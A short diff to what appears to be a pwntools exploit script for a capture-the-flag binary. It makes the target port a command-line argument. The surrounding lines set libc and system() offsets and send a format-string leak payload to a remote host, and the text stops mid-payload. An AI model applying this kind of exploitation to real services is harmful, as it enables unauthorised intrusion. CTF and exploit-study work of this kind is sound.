@@ -8,11 +8,11 @@ libc_offset = 172490
 system_offset = 0x58740
 
 HOST = sys.argv[1]
-PORT = 3113
+PORT = sys.argv[2]
 
 def main():
     # io = process(["docker", "run", "-i", "-v", f"{os.getcwd()}:/kek", "ubuntu@sha256:8a37d68f4f73ebf3d4efafbcf66379bf3728902a8038616808f04e34a9ab63ee", "/kek/pointless"])
-    io = remote(HOST, 3113)
+    io = remote(HOST, PORT)
 
     pause()
     io.sendlineafter(b"delim> ", b"naaaaaaa" + b''.join(f"%{i + 21}$s".encode() for i in range(8))  +
